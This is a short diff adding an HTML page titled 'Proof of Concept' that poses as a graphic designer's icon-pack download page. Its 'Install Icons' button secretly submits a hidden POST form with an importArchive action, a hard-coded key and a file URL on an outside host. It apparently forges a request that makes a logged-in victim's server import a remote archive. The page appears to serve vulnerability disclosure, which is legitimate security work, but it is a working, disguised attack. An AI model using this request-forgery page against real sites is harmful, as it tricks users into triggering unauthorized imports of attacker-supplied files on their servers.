@@ -1,0 +1,32 @@
+<head>
+    <title>Proof of Concept</title>
+
+    <style type="text/css">
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+    <p>I am a graphic designer!</p>
+    <p>Look at my icon pack</p>
+    <img src="images/iconpack.jpg" style="width: 400px; height: auto;" />
+    <p>To install it, click the button below!</p>
+    <form id="form" method="POST" action="/">
+        <input type="hidden" name="a" value="importArchive" />
+        <input type="hidden" name="key" value="abc123" />
+        <input type="hidden" name="file" value="http://iostheme.live/uploads/icon-pack.zip" />
+        <input type="submit" id="submit" value="Install Icons" onclick="submitAndLoad()" />
+    </form>
+    <img id="loading" class="hidden" src="images/loading.gif" />
+</body>
+
+<script>
+    function submitAndLoad() {
+        document.getElementById('loading').classList.remove('hidden');
+        document.getElementById('submit').setAttribute('disabled', 'true');
+        document.getElementById('form').submit();
+    }
+</script>
+
